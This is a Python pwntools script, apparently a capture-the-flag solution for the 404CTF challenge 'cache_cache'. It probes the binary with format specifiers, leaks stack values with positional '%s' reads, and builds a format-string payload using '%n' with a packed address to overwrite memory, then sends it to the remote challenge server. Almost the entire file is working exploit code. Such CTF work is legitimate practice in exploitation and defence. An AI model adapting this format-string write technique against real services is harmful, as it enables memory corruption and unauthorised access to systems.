from pwn import *

def test_format():
	formats = ["%n", "%s", "%x"]
	format_strings = []

	for n in range(200):
		for f in formats:
			try:
				p = process("./cache_cache")
				retstr = p.recvuntil(b'\n', drop=True).decode('utf-8')
				p.sendline("".join(format_strings).replace("%n", "%x") + f)
				retstr = p.recvuntil(b'\n', drop=True)
				p.close()
				format_strings.append(f)
				break
			except EOFError:
				p.close()
				continue

	print(" ".join(format_strings))


def get_values_from_format():
	with open("values", "wb") as f:
		for n in range(500):
			try:
				p = process("./cache_cache")
				retstr = p.recvuntil(b'\n', drop=True).decode('utf-8')
				p.sendline("%%%d$s\n" % n)
				retstr = p.recvuntil(b'\n', drop=True)
				print(retstr)
				f.write(retstr + b"\n")
				p.close()
			except EOFError:
				p.close()
				continue

def exploit_format():
	#payload = b'\x42\x42\x42%31$s' + bytes("\x90\xdd\xff\xff\xff\x7f\x00\x00", 'latin-1')  # gdb
	#payload = b'\x42\x42\x42%31$s' + bytes("\x90\xde\xff\xff\xff\x7f\x00\x00", 'latin-1')  # irl
	
	#payload = b'%4200747s%32$n\x42\x42' + bytes('\x78\x20\x4c\x00\x00\x00\x00', 'latin-1')  # gdb
	payload = bytes('%4200747s%32$n\x42\x42', 'latin-1') + bytes('\x78\x20\x4c\x00\x00\x00\x00\x00', 'latin-1') + bytes("\n", "latin-1") # irl
	
	with open("payload", "wb") as f:
		f.write(payload)

	#p = process("./cache_cache")
	p = remote('challenge.404ctf.fr', 31946)

	retstr = p.recvuntil(b'\n', ).decode('latin-1')
	print(retstr)

	p.send(payload)

	while len(retstr):
		retstr = p.recvline()
		print(retstr)

		if b"Quel est votre mot de passe?\n" == retstr:
			p.sendline(b"test")


	p.close()
	#print(retstr)
	#print(retstr)
	p.close()
	
if __name__ == "__main__":
	#test_format()
	#get_values_from_format()
	exploit_format()